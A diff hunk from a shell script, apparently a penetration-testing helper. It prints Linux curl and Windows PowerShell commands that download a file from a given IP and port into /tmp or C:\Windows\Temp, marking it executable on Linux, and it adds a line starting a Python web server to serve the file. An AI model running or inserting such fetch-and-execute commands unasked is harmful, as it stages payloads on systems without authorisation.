@@ -26,3 +26,5 @@ echo -e "${Point} curl http://$ip:$port/$1 -o /tmp/$1; chmod +x /tmp/$1"
 echo -e "${Frame}###${End} ${Title}Windows${End} ${Frame}###${End}"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/$1','C:\\\Windows\\\Temp\\\\$1')"
 
+
+sudo python3 -m http.server 8888
